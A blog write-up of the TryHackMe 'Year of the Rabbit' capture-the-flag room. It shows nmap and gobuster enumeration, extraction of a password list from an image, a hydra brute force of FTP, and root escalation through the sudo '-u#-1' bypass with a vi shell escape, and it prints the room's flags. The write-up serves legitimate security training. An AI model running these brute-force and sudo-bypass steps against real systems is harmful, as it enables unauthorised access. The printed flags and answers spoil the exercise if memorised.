---
layout: post
title:  "TryHackMe: Year of the Rabbit"
description: Time to enter the warren...
date:   2024-05-07 16:53:59 +0100
categories: jekyll update
---

# Year of the Rabbit

```sh
export IP= M-ip
```

# Enumeration: 
```sh
nmap -sV -sC -A  $IP
```

```sh

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 19:32 EDT
Nmap scan report for 10.10.185.241
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Brute forcing Dir:
gobuster dir --url http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```sh
/assets               (Status: 301) [Size: 315] [--> http://10.10.185.241/assets/]
```
![Screenshot_45](https://github.com/a-9-k/WriteUps/assets/53786047/af2eb051-bbe6-481e-af42-8d9bdacd9c5e)


I found in style.css a hint for a dir :

![Screenshot_46](https://github.com/a-9-k/WriteUps/assets/53786047/5bca8390-0b70-4db3-8d30-97776dd8158f)

I checked the directory /sup3r_s3cr3t_fl4g.php :

![Screenshot_49](https://github.com/a-9-k/WriteUps/assets/53786047/dd0d8957-7e19-43a1-9c0a-0facb08adf79)

# Disabling Java script:

```sh
chrome://settings/content/javascript?search=javascript
```
![Screenshot_47](https://github.com/a-9-k/WriteUps/assets/53786047/379c0884-f4b7-4af9-824f-883d51e3faaa)

after disabling Javascript it displayed this hint:

![Screenshot_48](https://github.com/a-9-k/WriteUps/assets/53786047/0a07f249-c4ca-4c1b-9549-4982ba565792)

I did not get anything from here so i thought that certainly something was going on in the back-end, so i fired up burpsuite and test the Link that we found earlier.

I found this Hidden directory

![Screenshot_50](https://github.com/a-9-k/WriteUps/assets/53786047/0e618712-4e81-44de-9571-930ea388a2f4)

![Screenshot_52](https://github.com/a-9-k/WriteUps/assets/53786047/e484c500-f9e0-440d-a9ac-ba851565db1b)

# Brute forcing ftp:

I download the image that we found, and i ran strings on it.
I found a list of passwords for the ftp user.
```sh
strings Hot_Babe.png
```
<details>
  <summary><i>ftp_pass.txt</i></summary>
  <pre>
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr   
1618B0AUshw1M   
A56IpIl%1s02u   
vTFbDzX9&Nmu?   
FfF~sfu^UQZmT   
8FF?iKO27b~V0   
ua4W~2-@y7dE$   
3j39aMQQ7xFXT   
Wb4--CTc4ww*-   
u6oY9?nHv84D&   
0iBp4W69Gr_Yf   
TS*%miyPsGV54   
C77O3FIy0c0sd   
O14xEhgg0Hxz1   
5dpv#Pr$wqH7F   
1G8Ucoce1+gS5   
0plnI%f0~Jw71      
0kLoLzfhqq8u&   
kS9pn5yiFGj6d   
zeff4#!b5Ib_n   
rNT4E4SHDGBkl   
KKH5zy23+S0@B   
3r6PHtM4NzJjE   
gm0!!EC1A0I2?   
HPHr!j00RaDEi   
7N+J9BYSp4uaY   
PYKt-ebvtmWoC   
3TN%cD_E6zm*s   
eo?@c!ly3&=0Z   
nR8&FXz$ZPelN   
eE4Mu53UkKHx#   
86?004F9!o49d   
SNGY0JjA5@0EE   
trm64++JZ7R6E   
3zJuGL~8KmiK^   
CR-ItthsH%9du   
yP9kft386bB8G   
A-*eE3L@!4W5o   
GoM^$82l&GA5D   
1t$4$g$I+V_BH   
0XxpTd90Vt8OL   
j0CN?Z#8Bp69_   
G#h~9@5E5QA5l       
DRWNM7auXF7@j   
Fw!if_=kk7Oqz   
92d5r$uyw!vaE   
c-AA7a2u!W2*?   
zy8z3kBi#2e36   
J5%2Hn+7I6QLt
gL$2fmgnq8vI*   
Etb?i?Kj4R=QM   
7CabD7kwY7=ri       
4uaIRX~-cY6K4
kY1oxscv4EB2d       
k32?3^x1ex7#o   
ep4IPQ_=ku@V8
tQxFJ909rd1y2   
5L6kpPR5E2Msn       
65NX66Wv~oFP2
LRAQ@zcBphn!1   
V4bt3*58Z32Xe   
ki^t!+uqB?DyI   
5iez1wGXKfPKQ   
nJ90XzX&AnF5v   
7EiMd5!r%=18c   
wYyx6Eq-T^9#@   
yT2o$2exo~UdW   
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^   
3O$oC~%XUlRO@   
KW3fjzWpUGHSW   
nTzl5f=9eS&*W   
WS9x0ZF=x1%8z   
Sr4*E4NT5fOhS   
hLR3xQV*gHYuC   
4P3QgF5kflszS   
NIZ2D%d58*v@R   
0rJ7p%6Axm05K   
94rU30Zx45z5c
Vi^Qf+u%0*q_S   
1Fvdp&bNl3#&l   
zLH%Ot0Bw&c%9   
</pre>
</details>


```sh
hydra -l ftpuser  -P /home/user/ftp_pass.txt ftp://IP
```

![Screenshot_51](https://github.com/a-9-k/WriteUps/assets/53786047/f630e561-6bde-4e29-ac5e-30358919c2e8)

```sh
ftp ftpuser@IP 

-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
```
We got some brainfuck code in here:

```sh
ftp> more Eli's_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- -. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <

```
I use this online decoder to decode it 'https://www.dcode.fr/brainfuck-language'.

```sh
User: eli
Password: DSpDpasssAEwid
```
# Initial access:

```sh
ssh eli@IP
```

I got this message when i ssh into the machine.  

```sh

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```
By doing some enumerating i found the folder in 

/usr/games/s3cr3t

```sh
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MnipasssHUNI
Honestly!

Yours sincerely
   -Root
```
this hidden message contain the password of the user gwendoline

We got the first flag in /home/gwendoline/user.txt

```sh
THM{1107174FFFFFLLLLLAAAAAGGGGGG1589bae53}
```

I check the sudoers file for the user gwendoline

```sh
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

```

(ALL, !root): This part specifies the users (ALL means all users) and the target user 
(!root means any user except root) that gwendoline can run the commands as.
NOPASSWD: This means that gwendoline can run the command without entering a password.
/usr/bin/vi /home/gwendoline/user.txt: This is the command gwendoline is allowed to run. 
It specifies that gwendoline can run the vi command as any user except root.

I found this article on this subject you can check it:

[minus_1_uid](https://www.sudo.ws/security/advisories/minus_1_uid/)

```sh
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

run the ':!/bin/sh' in the vi 

# id
uid=0(root) gid=0(root) groups=0(root)
# ls 
user.txt
# cd /root
# ls
root.txt
# cat root.txt	
THM{8d6f163aFFFLLLAAAGGGaef0f3a0ecf9161}
```
